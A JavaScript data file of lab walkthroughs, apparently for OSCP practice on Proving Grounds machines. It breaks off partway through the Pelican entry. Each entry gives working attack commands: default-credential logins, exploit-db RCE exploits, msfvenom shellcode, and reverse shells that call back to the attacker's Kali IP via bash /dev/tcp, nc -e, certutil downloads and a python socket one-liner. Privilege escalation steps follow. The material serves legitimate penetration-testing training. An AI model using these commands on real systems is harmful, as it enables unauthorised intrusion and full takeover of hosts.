/* Step-by-step walkthroughs for labs, shown on the lab page.
   Built by build_guides.py. {K} is your Kali IP and {T} the target IP. */
window.OSCP_GUIDES = {
 "pgp-jacko": {
  "title": "Windows · H2 database → PaperStream privesc",
  "ips": {
   "K": "192.168.45.180",
   "T": "192.168.153.66"
  },
  "steps": [
   {
    "h": "Recon",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo nmap -p- --min-rate 5000 -Pn {T} -oN jacko_ports.txt\nsudo nmap -sC -sV -p 80,135,139,445,5040,8082,9092 -Pn {T} -oN jacko_svc.txt"
     },
     {
      "t": "out",
      "v": "80/tcp   open  http     Microsoft IIS 10.0  |_http-title: H2 Database Engine (redirect)\n445/tcp  open  microsoft-ds?\n8082/tcp open  http     H2 database http console\n9092/tcp open  XmlIpcRegSvc?"
     },
     {
      "t": "p",
      "v": "🎯 The lead is the **H2 web console on port 8082**."
     }
    ]
   },
   {
    "h": "Get into the H2 console",
    "b": [
     {
      "t": "p",
      "v": "Browse to `http://{T}:8082` and log in with:"
     },
     {
      "t": "list",
      "v": [
       "JDBC URL: `jdbc:h2:~/test`",
       "User: `sa`",
       "Password: blank ✅ (the default works)"
      ]
     },
     {
      "t": "p",
      "v": "The footer shows **H2 1.4.199**, which is vulnerable to JNI code execution (**EDB-49384**)."
     }
    ]
   },
   {
    "h": "RCE through SQL (EDB-49384)",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "searchsploit h2 1.4.199\nsearchsploit -m 49384"
     },
     {
      "t": "p",
      "v": "Paste the queries from `49384.txt` into the console in this order:"
     },
     {
      "t": "list",
      "v": [
       "`SELECT CSVWRITE('C:\\Windows\\Temp\\JNIScriptEngine.dll', ...)`: the long hex blob from the file, which drops the DLL.",
       "Load it, create the eval alias and test it:"
      ]
     },
     {
      "t": "code",
      "lang": "sql",
      "v": "CREATE ALIAS IF NOT EXISTS System_load FOR \"java.lang.System.load\";\nCALL System_load('C:\\Windows\\Temp\\JNIScriptEngine.dll');\nCREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR \"JNIScriptEngine.eval\";\nCALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"whoami\").getInputStream()).useDelimiter(\"\\\\Z\").next()');"
     },
     {
      "t": "out",
      "v": "jacko\\tony"
     },
     {
      "t": "p",
      "v": "🎉 Code execution as **tony**."
     }
    ]
   },
   {
    "h": "Reverse shell",
    "b": [
     {
      "t": "p",
      "v": "On Kali, serve nc.exe and start a listener:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "cp /usr/share/windows-resources/binaries/nc.exe .\npython3 -m http.server 80"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "rlwrap nc -lvnp 8082"
     },
     {
      "t": "p",
      "v": "Run these through H2, one at a time (they replace the `exec(\"...\")` part):"
     },
     {
      "t": "code",
      "lang": "sql",
      "v": "CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"certutil -urlcache -split -f http://{K}/nc.exe C:/Users/tony/nc.exe\").getInputStream()).useDelimiter(\"\\\\Z\").next()');"
     },
     {
      "t": "code",
      "lang": "sql",
      "v": "CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\"C:/Users/tony/nc.exe {K} 8082 -e cmd.exe\").getInputStream()).useDelimiter(\"\\\\Z\").next()');"
     },
     {
      "t": "warn",
      "v": "Call back on **port 8082**. Egress is filtered, so use a port the box already uses."
     }
    ]
   },
   {
    "h": "Fix the broken PATH (Jacko-specific)",
    "b": [
     {
      "t": "p",
      "v": "`whoami` says \"not recognized\" until you run this:"
     },
     {
      "t": "code",
      "lang": "cmd",
      "v": "set PATH=%PATH%;C:\\Windows\\System32;C:\\Windows\\System32\\WindowsPowerShell\\v1.0;\nwhoami\ntype C:\\Users\\tony\\Desktop\\local.txt"
     },
     {
      "t": "flag",
      "v": "local.txt captured"
     }
    ]
   },
   {
    "h": "Privesc enumeration",
    "b": [
     {
      "t": "code",
      "lang": "cmd",
      "v": "whoami /priv\ndir \"C:\\Program Files (x86)\"\ntype \"C:\\Program Files (x86)\\PaperStream IP\\TWAIN\\readmeenu.rtf\""
     },
     {
      "t": "p",
      "v": "Found **PaperStream IP (TWAIN) 1.42**, which is vulnerable to **EDB-49382**: a DLL hijack through the FJTWSVIC service, which runs as SYSTEM."
     }
    ]
   },
   {
    "h": "SYSTEM via PaperStream (EDB-49382)",
    "b": [
     {
      "t": "p",
      "v": "On Kali:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "searchsploit -m 49382\nmv 49382.ps1 exploit.ps1\nmsfvenom -p windows/shell_reverse_tcp LHOST={K} LPORT=8082 -f dll -o UninOldIS.dll\npython3 -m http.server 80"
     },
     {
      "t": "p",
      "v": "In `exploit.ps1`, set `$PayloadFile = \"C:\\Windows\\Temp\\UninOldIS.dll\"`."
     },
     {
      "t": "p",
      "v": "Start a new listener (kill the old one, or use another tab):"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "rlwrap nc -lvnp 8082"
     },
     {
      "t": "p",
      "v": "On the target:"
     },
     {
      "t": "code",
      "lang": "cmd",
      "v": "cd C:\\Windows\\Temp\ncertutil -urlcache -split -f http://{K}/UninOldIS.dll UninOldIS.dll\ncertutil -urlcache -split -f http://{K}/exploit.ps1 exploit.ps1\npowershell -ep bypass C:\\Windows\\Temp\\exploit.ps1"
     },
     {
      "t": "out",
      "v": "nt authority\\system"
     },
     {
      "t": "code",
      "lang": "cmd",
      "v": "type C:\\Users\\Administrator\\Desktop\\proof.txt"
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     }
    ]
   }
  ],
  "backup": {
   "h": "Backup route: GodPotato",
   "b": [
    {
     "t": "p",
     "v": "If `whoami /priv` shows **SeImpersonatePrivilege** enabled:"
    },
    {
     "t": "code",
     "lang": "cmd",
     "v": "certutil -urlcache -split -f http://{K}/GodPotato-NET4.exe C:\\Windows\\Temp\\gp.exe\nC:\\Windows\\Temp\\gp.exe -cmd \"C:\\Users\\tony\\nc.exe {K} 8082 -e cmd.exe\""
    }
   ]
  },
  "takeaways": [
   "🔑 Try **default creds** on every web console (`sa` with a blank password).",
   "🌐 A reverse shell that dies means **egress is filtered**: reuse an open port like 8082 or 80.",
   "🛠️ A shell where nothing works usually means a **broken PATH**: set it by hand.",
   "📂 Always check `Program Files (x86)` for third-party software, then `searchsploit` its version."
  ]
 },
 "pgp-nibbles": {
  "title": "Linux · Postgres RCE → SUID find",
  "ips": {
   "K": "192.168.45.180",
   "T": "192.168.153.47"
  },
  "steps": [
   {
    "h": "Recon",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo nmap -p- --min-rate 5000 -Pn {T} -oN nibbles_ports.txt\nsudo nmap -sC -sV -p 21,22,80,139,445,5437 -Pn {T} -oN nibbles_svc.txt"
     },
     {
      "t": "out",
      "v": "21/tcp   open   ftp         vsftpd 3.0.3\n22/tcp   open   ssh         OpenSSH 7.9p1 Debian\n80/tcp   open   http        Apache httpd 2.4.38\n139/tcp  closed netbios-ssn\n445/tcp  closed microsoft-ds\n5437/tcp open   postgresql  PostgreSQL DB 11.3 - 11.7"
     },
     {
      "t": "p",
      "v": "🎯 The lead is **PostgreSQL on port 5437**, an odd port that only a full `-p-` scan finds."
     }
    ]
   },
   {
    "h": "Dead ends",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "ftp {T}\ncurl -s http://{T}/"
     },
     {
      "t": "p",
      "v": "❌ FTP has no anonymous login, and the website is a static page. Move on."
     }
    ]
   },
   {
    "h": "Postgres default creds",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "psql -h {T} -p 5437 -U postgres"
     },
     {
      "t": "p",
      "v": "Password: `postgres`"
     },
     {
      "t": "code",
      "lang": "sql",
      "v": "SELECT version();\n\\du"
     },
     {
      "t": "out",
      "v": "PostgreSQL 11.7 (Debian 11.7-0+deb10u1)\n postgres | Superuser, Create role, Create DB, Replication, Bypass RLS"
     },
     {
      "t": "p",
      "v": "✅ You are a **superuser**, so `COPY FROM PROGRAM` gives RCE (CVE-2019-9193)."
     }
    ]
   },
   {
    "h": "Read files (optional)",
    "b": [
     {
      "t": "code",
      "lang": "sql",
      "v": "SELECT pg_read_file('/etc/passwd', 0, 2000);"
     },
     {
      "t": "out",
      "v": "wilson:x:1000:1000:...:/home/wilson:/bin/bash"
     },
     {
      "t": "p",
      "v": "The user is **wilson**."
     }
    ]
   },
   {
    "h": "RCE",
    "b": [
     {
      "t": "code",
      "lang": "sql",
      "v": "DROP TABLE IF EXISTS cmd_exec;\nCREATE TABLE cmd_exec(cmd_output text);\nCOPY cmd_exec FROM PROGRAM 'id';\nSELECT * FROM cmd_exec;"
     },
     {
      "t": "out",
      "v": "uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)"
     },
     {
      "t": "p",
      "v": "🎉 Code execution as **postgres**."
     }
    ]
   },
   {
    "h": "Reverse shell",
    "b": [
     {
      "t": "p",
      "v": "On Kali:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "rlwrap nc -lvnp 80"
     },
     {
      "t": "p",
      "v": "In psql:"
     },
     {
      "t": "code",
      "lang": "sql",
      "v": "COPY cmd_exec FROM PROGRAM 'bash -c \"bash -i >& /dev/tcp/{K}/80 0>&1\"';"
     },
     {
      "t": "out",
      "v": "postgres@nibbles:/var/lib/postgresql/11/main$"
     },
     {
      "t": "warn",
      "v": "Egress is filtered, so call back on **port 80**. psql hangs while the shell is open, which is normal."
     }
    ]
   },
   {
    "h": "Stabilise the shell and grab local.txt",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nexport TERM=xterm"
     },
     {
      "t": "p",
      "v": "Press `Ctrl+Z`, then on Kali run `stty raw -echo; fg` and press Enter."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "cat /home/wilson/local.txt"
     },
     {
      "t": "flag",
      "v": "local.txt captured"
     }
    ]
   },
   {
    "h": "Privesc enumeration",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "find / -perm -u=s -type f 2>/dev/null"
     },
     {
      "t": "out",
      "v": "/usr/bin/su\n/usr/bin/mount\n/usr/bin/passwd\n/usr/bin/find      <-- not normal!\n/usr/bin/sudo"
     },
     {
      "t": "p",
      "v": "🎯 `find` has the SUID bit set, and it's on **GTFOBins**."
     }
    ]
   },
   {
    "h": "Root",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "/usr/bin/find . -exec /bin/sh -p \\; -quit\nid\ncat /root/proof.txt"
     },
     {
      "t": "out",
      "v": "uid=106(postgres) gid=113(postgres) euid=0(root)"
     },
     {
      "t": "warn",
      "v": "The `-p` flag is required. Without it, the shell drops the root privileges."
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     }
    ]
   }
  ],
  "takeaways": [
   "🔍 Always run a **full port scan**: services hide on odd ports.",
   "🔑 For any database, try **default creds** first (`postgres:postgres`).",
   "💥 A Postgres superuser gets RCE through `COPY FROM PROGRAM`, no exploit needed.",
   "🌐 If a reverse shell fails, reuse port **80 or 443** to get past the egress filter.",
   "📂 Run `find / -perm -u=s` and check every unusual binary on **GTFOBins**."
  ]
 },
 "pgp-bratarina": {
  "title": "Linux · OpenSMTPD RCE → direct root",
  "lab": {
   "name": "Bratarina",
   "platform": "PG Practice",
   "os": "Linux"
  },
  "ips": {
   "K": "192.168.45.180",
   "T": "192.168.153.71"
  },
  "steps": [
   {
    "h": "Recon",
    "b": [
     {
      "t": "p",
      "v": "There is only **one flag** on this box: `proof.txt`."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo nmap -p- --min-rate 5000 -Pn {T} -oN brat_ports.txt\nsudo nmap -sC -sV -p 22,25,53,80,445 -Pn {T} -oN brat_svc.txt"
     },
     {
      "t": "out",
      "v": "22/tcp  open   ssh          OpenSSH 7.6p1 Ubuntu\n25/tcp  open   smtp         OpenSMTPD\n53/tcp  closed domain\n80/tcp  open   http         nginx 1.14.0  (FlaskBB)\n445/tcp open   netbios-ssn  Samba smbd 4.7.6-Ubuntu"
     },
     {
      "t": "p",
      "v": "🎯 The leads are **SMB (445)** and **OpenSMTPD (25)**."
     }
    ]
   },
   {
    "h": "SMB null session",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "smbclient -N -L //{T}/"
     },
     {
      "t": "out",
      "v": "backups   Disk   Share for backups"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "smbclient -N //{T}/backups"
     },
     {
      "t": "p",
      "v": "Inside the smbclient prompt:"
     },
     {
      "t": "code",
      "lang": "smb",
      "v": "get passwd.bak\nexit"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "cat passwd.bak"
     },
     {
      "t": "out",
      "v": "neil:x:1000:1000:neil,,,:/home/neil:/bin/bash"
     },
     {
      "t": "p",
      "v": "🐇 A rabbit hole: you get a username and nothing else. Move on to SMTP."
     }
    ]
   },
   {
    "h": "SMTP banner and searchsploit",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "nc -nv {T} 25"
     },
     {
      "t": "out",
      "v": "220 bratarina ESMTP OpenSMTPD"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "searchsploit opensmtpd\nsearchsploit -m 47984"
     },
     {
      "t": "out",
      "v": "OpenSMTPD 6.6.1 - Remote Code Execution | linux/remote/47984.py"
     },
     {
      "t": "p",
      "v": "💥 **CVE-2020-7247**: commands are injected through the MAIL FROM field and run **as root**."
     }
    ]
   },
   {
    "h": "Confirm the RCE",
    "b": [
     {
      "t": "p",
      "v": "Terminal 1:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo tcpdump -i tun0 icmp"
     },
     {
      "t": "p",
      "v": "Terminal 2:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "python3 47984.py {T} 25 'ping -c 2 {K}'"
     },
     {
      "t": "out",
      "v": "IP {T} > {K}: ICMP echo request"
     },
     {
      "t": "p",
      "v": "✅ RCE is confirmed."
     }
    ]
   },
   {
    "h": "Reverse shell as root",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "rlwrap nc -lvnp 80"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "python3 47984.py {T} 25 'python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"{K}\\\",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])\"'"
     },
     {
      "t": "out",
      "v": "uid=0(root) gid=0(root) groups=0(root)"
     },
     {
      "t": "warn",
      "v": "Egress is filtered, so call back on **port 80**."
     }
    ]
   },
   {
    "h": "proof.txt",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\ncat /root/proof.txt"
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     }
    ]
   }
  ],
  "backup": {
   "h": "Backup route: host a script and fetch it",
   "b": [
    {
     "t": "code",
     "lang": "bash",
     "v": "echo 'bash -i >& /dev/tcp/{K}/80 0>&1' > shell.sh\npython3 -m http.server 445"
    },
    {
     "t": "code",
     "lang": "bash",
     "v": "python3 47984.py {T} 25 'wget http://{K}:445/shell.sh -O /tmp/shell.sh'\npython3 47984.py {T} 25 'bash /tmp/shell.sh'"
    }
   ]
  },
  "takeaways": [
   "📡 **Grab the banner** of every service, then `searchsploit` it.",
   "📂 Check SMB with a **null session** (`smbclient -N -L`).",
   "🐇 Don't get stuck on rabbit holes like passwd.bak.",
   "🏓 For blind RCE, confirm with `ping` and `tcpdump` first.",
   "🌐 To get past the egress filter, call back on ports the box already uses (**80, 445**).",
   "👑 A service running as root gives you root directly, with no privesc needed."
  ]
 },
 "pgp-clamav": {
  "title": "Linux · Sendmail + clamav-milter RCE → direct root",
  "lab": {
   "name": "ClamAV",
   "platform": "PG Practice",
   "os": "Linux"
  },
  "ips": {
   "K": "192.168.45.180",
   "T": "192.168.153.52"
  },
  "steps": [
   {
    "h": "Recon",
    "b": [
     {
      "t": "p",
      "v": "There is only **one flag**, `proof.txt`: the exploit drops you straight in as root."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo nmap -p- --min-rate 5000 -Pn {T} -oN clam_ports.txt\nsudo nmap -sC -sV -p 22,25,80 -Pn {T} -oN clam_svc.txt"
     },
     {
      "t": "out",
      "v": "22/tcp open  ssh      OpenSSH 7.2p2 Ubuntu\n25/tcp open  smtp     Sendmail 8.15.2\n80/tcp open  http     Apache httpd 2.4.18"
     },
     {
      "t": "p",
      "v": "🎯 The lead is **Sendmail on 25**, paired with **clamav-milter** on this box."
     }
    ]
   },
   {
    "h": "SMTP banner",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "nc -nv {T} 25"
     },
     {
      "t": "out",
      "v": "220 clamav ESMTP Sendmail 8.15.2"
     },
     {
      "t": "p",
      "v": "💥 **CVE-2007-4560**: the `RCPT TO` field is passed to a shell, so commands run **as root**."
     }
    ]
   },
   {
    "h": "Find the exploit",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "searchsploit clamav\nsearchsploit -m 4761"
     },
     {
      "t": "out",
      "v": "Sendmail with clamav-milter < 0.91.2 - Remote Root Command Execution | 4761.pl"
     }
    ]
   },
   {
    "h": "Manual exploit, part 1: download the payload",
    "b": [
     {
      "t": "p",
      "v": "On Kali, make the payload and host it:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "echo 'bash -i >& /dev/tcp/{K}/80 0>&1' > shell.sh\npython3 -m http.server 80"
     },
     {
      "t": "p",
      "v": "Open an SMTP session and inject through the backticks in `RCPT TO`:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "nc -nv {T} 25"
     },
     {
      "t": "code",
      "lang": "smtp",
      "v": "HELO x\nMAIL FROM: <root>\nRCPT TO: <nobody+`wget http://{K}/shell.sh -O /tmp/s.sh`>\nDATA\ntest\n.\nQUIT"
     },
     {
      "t": "p",
      "v": "Wait for `GET /shell.sh` in the web server window, then stop it with `Ctrl+C`."
     },
     {
      "t": "warn",
      "v": "Keep the **nobody+** format with its backticks exactly as shown: the backticks are what run the command."
     }
    ]
   },
   {
    "h": "Manual exploit, part 2: run it as root",
    "b": [
     {
      "t": "warn",
      "v": "The web server and the listener both need **port 80** on Kali (egress is filtered), and only one can use it at a time. Stop the web server before you start the listener."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "rlwrap nc -lvnp 80"
     },
     {
      "t": "p",
      "v": "A second mail runs the payload:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "nc -nv {T} 25"
     },
     {
      "t": "code",
      "lang": "smtp",
      "v": "HELO x\nMAIL FROM: <root>\nRCPT TO: <nobody+`bash /tmp/s.sh`>\nDATA\ntest\n.\nQUIT"
     },
     {
      "t": "out",
      "v": "uid=0(root) gid=0(root) groups=0(root)"
     },
     {
      "t": "p",
      "v": "👑 Root shell on the listener."
     }
    ]
   },
   {
    "h": "proof.txt",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\ncat /root/proof.txt"
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     }
    ]
   }
  ],
  "backup": {
   "h": "Backup route: the automated exploit",
   "b": [
    {
     "t": "p",
     "v": "Same order: web server on 80 for the first command, then stop it and start the listener on 80 for the second."
    },
    {
     "t": "code",
     "lang": "bash",
     "v": "perl 4761.pl {T} 'wget http://{K}/shell.sh -O /tmp/s.sh'\nperl 4761.pl {T} 'bash /tmp/s.sh'"
    },
    {
     "t": "p",
     "v": "Keep download and execute as two commands: a single chained one is unreliable through the milter."
    }
   ]
  },
  "takeaways": [
   "📧 **Sendmail + clamav** is a signature combo: go straight to CVE-2007-4560.",
   "📖 Read the **header/usage** of any downloaded exploit: argument order varies between copies.",
   "🖐️ Prefer the **manual method** when a scripted exploit is flaky.",
   "✂️ Split **download** and **execute** into two steps.",
   "🌐 Egress filtered? Reuse **port 80** for hosting and the callback, one at a time.",
   "👑 RCE as a root service means a **direct root shell**, no privesc stage."
  ]
 },
 "pgp-kevin": {
  "title": "Windows · HP Power Manager BOF → direct SYSTEM",
  "ips": {
   "K": "192.168.45.180",
   "T": "192.168.153.58"
  },
  "steps": [
   {
    "h": "Recon",
    "b": [
     {
      "t": "p",
      "v": "The overflow lands you straight as SYSTEM, so there's **no separate privesc**."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo nmap -p- --min-rate 5000 -Pn {T} -oN kevin_ports.txt\nsudo nmap -sC -sV -p 80,135,139,445,3389 -Pn {T} -oN kevin_svc.txt"
     },
     {
      "t": "out",
      "v": "80/tcp   open  http          HP Power Manager\n135/tcp  open  msrpc\n445/tcp  open  microsoft-ds\n3389/tcp open  ms-wbt-server"
     },
     {
      "t": "p",
      "v": "🎯 The lead is the **web app on port 80**."
     }
    ]
   },
   {
    "h": "Enumerate the web app",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "curl -s -I http://{T}/"
     },
     {
      "t": "p",
      "v": "Open `http://{T}/`: it's the **HP Power Manager Administration** login. Log in with the default **admin : admin**."
     },
     {
      "t": "p",
      "v": "The banner shows **HP Power Manager 4.2 build 13**, which is vulnerable to a stack buffer overflow."
     }
    ]
   },
   {
    "h": "Find the exploit",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "searchsploit hp power manager\nsearchsploit -m 10099"
     },
     {
      "t": "out",
      "v": "HP Power Manager 'formExportDataPoints' Buffer Overflow | 10099.pl"
     }
    ]
   },
   {
    "h": "Generate shellcode (bad chars matter)",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "msfvenom -p windows/shell_reverse_tcp LHOST={K} LPORT=443 \\\n  -b \"\\x00\\x0a\\x0d\\x25\\x26\\x2b\\x3d\" -f c -e x86/alpha_mixed EXITFUNC=thread"
     },
     {
      "t": "warn",
      "v": "The payload goes in a POST body, so it must be URL-safe. The bad chars are null, CR, LF and `% & + =`. **alpha_mixed** keeps it alphanumeric."
     }
    ]
   },
   {
    "h": "Edit and run EDB-10099",
    "b": [
     {
      "t": "p",
      "v": "In `10099.pl`, set the **target IP**, paste the **shellcode** from the last step, and check the **return address** matches HPPM 4.2."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "rlwrap nc -lvnp 443"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "perl 10099.pl {T}"
     },
     {
      "t": "out",
      "v": "C:\\Windows\\system32> whoami\nnt authority\\system"
     },
     {
      "t": "p",
      "v": "👑 Straight to **SYSTEM**."
     },
     {
      "t": "warn",
      "v": "Egress is filtered, so call back on **port 443** (or 80)."
     }
    ]
   },
   {
    "h": "Flags",
    "b": [
     {
      "t": "code",
      "lang": "cmd",
      "v": "type C:\\Users\\Administrator\\Desktop\\proof.txt\ndir C:\\Users /s /b | findstr local.txt"
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     }
    ]
   }
  ],
  "backup": {
   "h": "Backup route: Metasploit (your one allowed use)",
   "b": [
    {
     "t": "code",
     "lang": "msf",
     "v": "use exploit/windows/http/hp_power_manager_filename\nset RHOSTS {T}\nset LHOST {K}\nset LPORT 443\nset payload windows/shell_reverse_tcp\nrun"
    }
   ]
  },
  "takeaways": [
   "🔑 Old admin panels: try **default creds** (admin:admin), then fingerprint the exact version.",
   "🧬 For any public BOF, **regenerate the shellcode** with msfvenom. The bundled one is dead.",
   "🚫 Respect **bad characters**: HTTP and login overflows usually kill `\\x00 \\x0a \\x0d % & + =`.",
   "🌐 Callback not landing? **Egress filtering**: use port 443 or 80.",
   "👑 A service that overflows while running as SYSTEM gives a **direct SYSTEM shell**.",
   "1️⃣ Keep Metasploit as your **single allowed use**. Get the manual EDB route working first."
  ]
 },
 "pgp-twiggy": {
  "title": "Linux · SaltStack → direct root",
  "ips": {
   "K": "192.168.45.180",
   "T": "192.168.153.60"
  },
  "steps": [
   {
    "h": "Recon",
    "b": [
     {
      "t": "p",
      "v": "salt-master runs as root, so RCE here **is** root."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo nmap -p- --min-rate 5000 -Pn {T} -oN twiggy_ports.txt\nsudo nmap -sC -sV -p 22,53,80,4505,4506,8000 -Pn {T} -oN twiggy_svc.txt"
     },
     {
      "t": "out",
      "v": "4505/tcp open  zmtp   ZeroMQ ZMTP 2.0\n4506/tcp open  zmtp   ZeroMQ ZMTP 2.0\n8000/tcp open  http   SaltStack rest_cherrypy"
     },
     {
      "t": "p",
      "v": "🎯 Ports **4505/4506** are a SaltStack master. Port 8000 leaks version **3000**."
     }
    ]
   },
   {
    "h": "Vuln: CVE-2020-11651 (auth bypass) + CVE-2020-11652 (traversal)",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "searchsploit saltstack\nsearchsploit -m 48421     # or your offline jasperla PoC"
     }
    ]
   },
   {
    "h": "Confirm RCE",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "python3 exploit.py --master {T} --exec 'id'"
     },
     {
      "t": "out",
      "v": "uid=0(root) gid=0(root)"
     },
     {
      "t": "p",
      "v": "✅ Running as root."
     }
    ]
   },
   {
    "h": "Reverse shell as root",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "rlwrap nc -lvnp 80"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "python3 exploit.py --master {T} --exec 'bash -c \"bash -i >& /dev/tcp/{K}/80 0>&1\"'"
     },
     {
      "t": "warn",
      "v": "Egress is filtered: call back on port **80**."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "cat /root/proof.txt"
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     }
    ]
   }
  ],
  "takeaways": [
   "📡 ZeroMQ on **4505/4506** means SaltStack.",
   "📦 Keep PoCs **offline**: there's no internet in the exam.",
   "✅ Confirm with `id` before you try for a shell."
  ]
 },
 "pgp-algernon": {
  "title": "Windows · Sync Breeze BOF → SYSTEM",
  "ips": {
   "K": "192.168.45.180",
   "T": "192.168.153.62"
  },
  "steps": [
   {
    "h": "Recon",
    "b": [
     {
      "t": "p",
      "v": "The overflow lands you straight as SYSTEM."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo nmap -sC -sV -p 21,80,9121 -Pn {T}"
     },
     {
      "t": "out",
      "v": "80/tcp   open  http  Sync Breeze Enterprise\n9121/tcp open  http  Sync Breeze Enterprise"
     },
     {
      "t": "p",
      "v": "🎯 The login page footer shows **Sync Breeze Enterprise 10.0.28**."
     },
     {
      "t": "warn",
      "v": "**If this doesn't match:** most write-ups of PG Algernon show **SmarterMail**, not Sync Breeze: anonymous FTP, the SmarterMail web UI on port **9998**, and .NET remoting on **17001**. The usual exploit is `searchsploit -m 49216` (SmarterMail build 6985 RCE), which gives SYSTEM. Run a full `-p-` scan first and follow whichever service you actually see."
     }
    ]
   },
   {
    "h": "Exploit",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "searchsploit sync breeze\nsearchsploit -m 42341"
     }
    ]
   },
   {
    "h": "Fresh shellcode (bad chars)",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "msfvenom -p windows/shell_reverse_tcp LHOST={K} LPORT=443 -b \"\\x00\\x0a\\x0d\\x25\\x26\" -f python -v shellcode EXITFUNC=thread"
     },
     {
      "t": "p",
      "v": "Paste it into `42341.py`, and set `ip = \"{T}\"` and port 80."
     }
    ]
   },
   {
    "h": "Run",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "rlwrap nc -lvnp 443\npython2 42341.py"
     },
     {
      "t": "out",
      "v": "nt authority\\system"
     },
     {
      "t": "warn",
      "v": "Egress is filtered: call back on port **443**. The script is **python2**."
     },
     {
      "t": "code",
      "lang": "cmd",
      "v": "type C:\\Users\\Administrator\\Desktop\\proof.txt"
     },
     {
      "t": "flag",
      "v": "proof.txt captured 👑"
     }
    ]
   }
  ],
  "takeaways": [
   "🔍 Fingerprint the **exact version** before picking an exploit.",
   "🧬 Always **regenerate the shellcode**.",
   "🚫 HTTP overflows kill `\\x00 \\x0a \\x0d % &`."
  ]
 },
 "pgp-pelican": {
  "title": "Linux · Exhibitor RCE → gcore → root",
  "ips": {
   "K": "192.168.45.180",
   "T": "192.168.153.64"
  },
  "steps": [
   {
    "h": "Recon",
    "b": [
     {
      "t": "code",
      "lang": "bash",
      "v": "sudo nmap -sC -sV -p 22,80,2181,8080,8181 -Pn {T}"
     },
     {
      "t": "out",
      "v": "2181/tcp open  zookeeper 3.4.6\n8080/tcp open  http      Exhibitor Web UI"
     },
     {
      "t": "p",
      "v": "🎯 **Exhibitor** on 8080 lets you edit the `java.env` startup script, which is command injection."
     }
    ]
   },
   {
    "h": "Foothold: inject into the config",
    "b": [
     {
      "t": "p",
      "v": "Open `http://{T}:8080/exhibitor/v1/ui/index.html`, go to the **Config** tab, turn **Editing ON**, and put this in the **java.env script** field:"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "$(bash -i >& /dev/tcp/{K}/80 0>&1)"
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "rlwrap nc -lvnp 80"
     },
     {
      "t": "out",
      "v": "uid=1000(charles)"
     },
     {
      "t": "warn",
      "v": "Egress is filtered: call back on port **80**."
     },
     {
      "t": "code",
      "lang": "bash",
      "v": "cat /home/charles/local.txt"
     },
     {
      "t": "flag",
      "v": "local.txt captured"
     }
    ]
   },
   {
    "h": "Privesc enumeration",
    "b": [
     {
      "t": "code",
      "lang": "bash",
